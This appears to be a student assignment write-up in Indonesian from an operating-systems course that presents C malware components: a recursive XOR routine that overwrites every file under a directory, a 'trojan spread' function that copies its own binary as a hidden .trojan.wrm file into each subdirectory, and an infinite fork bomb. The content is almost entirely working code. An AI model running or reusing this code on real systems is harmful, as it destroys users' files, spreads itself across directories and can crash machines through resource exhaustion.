# Sisop-2-2025-IT35

**Soal 3 (Gilang)**

**==================**

*-Soal B ~ XOR encryptor-*

**==================**

Fungsi xor encrypt
```bash
void xor_encrypt(char *path, unsigned char key) {
    FILE *file = fopen(path, "rb+");
    if (!file) return;

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    rewind(file);

    unsigned char *buffer = malloc(size);
    if (!buffer) {
        fclose(file);
        return;
    }

    fread(buffer, 1, size, file);
    rewind(file);

    for (long i = 0; i < size; i++) {
        buffer[i] ^= key;
    }

    fwrite(buffer, 1, size, file);
    fclose(file);
    free(buffer);
}
```

Rekursif enkripsi seluruh file di direktori dan subdirektori
```bash
void encrypt_recursive(const char *base_path, unsigned char key) {
    DIR *dir = opendir(base_path);
    if (!dir) return;

    struct dirent *entry;
    char path[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        snprintf(path, sizeof(path), "%s/%s", base_path, entry->d_name);

        struct stat statbuf;
        if (stat(path, &statbuf) == -1) continue;

        if (S_ISDIR(statbuf.st_mode)) {
            encrypt_recursive(path, key);
        } else if (S_ISREG(statbuf.st_mode)) {
            xor_encrypt(path, key);
        }
    }

    closedir(dir);
}
```

**==================**

*-Soal C ~ Trojan Spread-*

**==================**

Fungsi mencopy file malware

```bash
void copy_file(const char *src, const char *dst) {
    FILE *source = fopen(src, "rb");
    if (!source) return;

    FILE *dest = fopen(dst, "wb");
    if (!dest) {
        fclose(source);
        return;
    }

    char buffer[4096];
    size_t bytes;

    while ((bytes = fread(buffer, 1, sizeof(buffer), source)) > 0) {
        fwrite(buffer, 1, bytes, dest);
    }

    fclose(source);
    fclose(dest);
}
```

Fungsi menyebar salinan malware ke seluruh direktori

```bash
void spread_trojan(const char *dir_path, const char *self_path) {
    DIR *dir = opendir(dir_path);
    if (!dir) return;

    struct dirent *entry;
    char path[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        snprintf(path, sizeof(path), "%s/%s", dir_path, entry->d_name);

        struct stat statbuf;
        if (stat(path, &statbuf) == -1) continue;

        if (S_ISDIR(statbuf.st_mode)) {
            char target_path[1024];
            snprintf(target_path, sizeof(target_path), "%s/.trojan.wrm", path);
            copy_file(self_path, target_path);

            spread_trojan(path, self_path);
        }
    }

    closedir(dir);
}
```

**================**

*-Soal E ~ Fork Bomb-*

**================**

```bash
void rodok_fork_bomb() {
    while (1) {
        fork();
    }
}

```

**=========================**

*-Soal A & D ~ Daemonize + Loop Fitur-*

**=========================**

